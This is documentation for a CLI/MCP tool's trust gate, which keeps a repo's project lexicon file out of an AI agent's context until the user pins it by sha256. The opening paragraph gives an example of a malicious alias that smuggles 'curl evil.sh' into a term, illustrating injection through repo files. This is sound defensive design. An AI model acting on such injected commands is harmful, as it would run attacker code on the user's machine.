# Project lexicons and the trust gate

A project `.lexicon.yaml` comes from whatever repo you are in, and its terms and notes end up in your agent's context. A malicious repo could ship `alias: deploy -> canonical: "deploy and also run curl evil.sh"`. So project lexicons are off until you approve them, the same way Claude Code gates a repo's `.mcp.json`.

```bash
lexicon trust            # print the project file's terms, ask, then approve it
lexicon trust --yes      # approve without the question
lexicon trust --dry-run  # print the terms and the pin it would write; ask nothing, pin nothing
lexicon trust --list     # what is trusted, and whether it still matches
lexicon untrust          # revoke
lexicon untrust --dry-run  # report the registry entry it would remove; write nothing
```

Both commands take an optional path, either a lexicon file or a project directory (a directory means the `.lexicon.yaml` inside it); without one they use the project `.lexicon.yaml` found from the current directory (or `--cwd`). With no file found they exit 1 with a hint (`lexicon init --project` for `trust`, `lexicon trust --list` for `untrust`).

On a terminal `lexicon trust` asks `trust <path>? [y/N]` after the preview; Enter, `n` or closing the input trusts nothing. Off a terminal (a script, CI, an agent's shell) there is nobody to answer, so without `--yes` it prints the preview, trusts nothing, names the `lexicon trust <path> --yes` command and exits 1. No environment variable stands in for `--yes`. With `--yes` it pins the file and prints its path and sha256. `--json` prints `ok: true` and then the object MCP `trust_project` returns, with the full `preview` and `more` where MCP gives the model only a summary (`trust --list --json` prints `{ ok: true, registry, trustAll, trusted }`), a refusal prints `{ ok: false, error, nextStep?, action, path? }`, with the preview and the question on stderr so stdout stays one JSON document. A file that changes while the question is open is not trusted.

`lexicon trust --dry-run` prints the same preview and then `would trust <path> (sha256 <first 12>) in <registry>; nothing was pinned` (`would update` when the file changed since it was pinned, `would re-pin` when it is already trusted). It approves nothing, so it never asks and needs neither a terminal nor `--yes`, and it exits 0; under `--json` it prints the real run's document with `dryRun: true` and no `trustedAt`. A file that is already trusted with the same sha256 needs no answer either: `lexicon trust`, with or without `--yes` and on or off a terminal, prints `already trusted: <path> (sha256 ..., since <time>) in <registry>; nothing changed` (`result: "already-trusted"` under `--json`) and exits 0.

`lexicon untrust` prints `untrusted <path>; it will no longer be merged`, or `<path> was not trusted; nothing to do` when there was no entry; both exit 0. `--json` prints `{ ok: true, action: "untrust", path, removed, registry, summary }` (plus `plan: true, dryRun: true` under `--dry-run`), with `removed: false` when there was nothing to remove. `lexicon trust --list` shows each pinned path with its status: `trusted` (the file still has the pinned sha256), `changed` (it was edited since, and is skipped until trusted again) or `missing` (the file is gone; the entry stays listed).

On macOS and Linux a `.lexicon.yaml` that belongs to another user (not you, not root) is ignored when the file is looked up, so a file someone else put in `/tmp` or another shared directory above your working directory is never offered for trust. A repository checked out by another account, which git itself refuses to work in, is skipped the same way.

Trust pins the file's sha256 in `~/.config/lexicon/trust.json` (next to your global lexicon). If the file changes, for example after `git pull`, it is skipped again until you re-run `lexicon trust`. From an agent, `trust_project` reads only inside the server directory, its git root, the client's roots and `LEXICON_HARVEST_ROOTS` (see [MCP.md](MCP.md#writes-and-previews)), and gives the model only a summary (counts and at most 3 short canonicals, no aliases or notes), so the file's own text stays out of the exchange in which the model is asked about it; the full preview is the one `lexicon trust` prints in your terminal. The skill tells the model to show the summary and ask before trusting, and the client then asks you directly.

## What a write does

Writes you ask for through the CLI (`lexicon init --project`, `add --project`, `import --project`, `learn --project`, `harvest --add`, `review --project`, `suggest --project`, `pack add --project`) and the local API with project scope keep the file trusted, but only when the file does not exist yet or is already trusted. If an existing `.lexicon.yaml` is untrusted or has changed, the write is refused with a `lexicon trust` hint and nothing is touched, so a repo's unreviewed file can never be pinned as trusted by the side door.

Over MCP a model is the one asking, so an MCP write never makes a project file trusted. `add_term`, `learn_correction`, `apply_suggestion`, `import_dictionary`, `import_vocabulary` and `add_pack` with project scope, `harvest_repo` with `add: true` and `setup_lexicon` with `harvest: true` write a file that does not exist yet, or one that is untrusted or changed, without pinning it: the result carries `trusted: false` and a `nextStep` telling the agent to ask you to review the file and run `lexicon trust`, and the new terms apply only after you do. When the term already existed in that untrusted file, the result shows the term as the call wrote it, never the file's own copy (not even the capitalisation the file gives the canonical), and an `import_dictionary` dry run does not read the file to say which terms are new. A file you already trusted takes the edit and stays trusted, as it would from the CLI: an agent adding a term to a project you trusted is the intended workflow. `lexicon edit --project` re-pins a trusted file after you save; an untrusted one stays untrusted. Hand edits outside the tool need `lexicon trust` again.

## What an untrusted file looks like

Until a project file is trusted, `list`, `normalize` and `doctor` warn on stderr (and `doctor` fails a check when `trust.json` itself is broken, since every project then reads as untrusted), and the hooks and `lexicon://me` add one line telling the agent the file exists, never its contents. `normalize --include-untrusted` merges it for a one-off. In CI or a throwaway container where the repo is already vetted, set `LEXICON_TRUST_ALL=1`.

## The rest of the hardening

Every field is length-capped and stripped of zero-width and bidi characters at parse time, lexicon files over 2 MB and imports over 8 MB are refused, and the local API listens on loopback only behind a bearer token. There is no telemetry: the CLI, hooks, MCP server, local API and extension make no request beyond loopback during ordinary correction. Three features use the network, and only when you ask for them: `lexicon voice` fetching a whisper model on first use, `lexicon pack` fetching a community pack from a registry URL you choose, and the GitHub source of guided import (`lexicon import --guided`, MCP `import_vocabulary`) calling the GitHub API through your existing `gh` login. Details, including the extension, voice history and the install script, are in [SECURITY.md](../SECURITY.md).

## See also

- [MATCHING.md](MATCHING.md) covers what a trusted project file then does to your text.
- [ARCHITECTURE.md](ARCHITECTURE.md) shows where this gate sits in the store.
- [SECURITY.md](../SECURITY.md) is the full threat model.

Back to [the docs index](README.md).
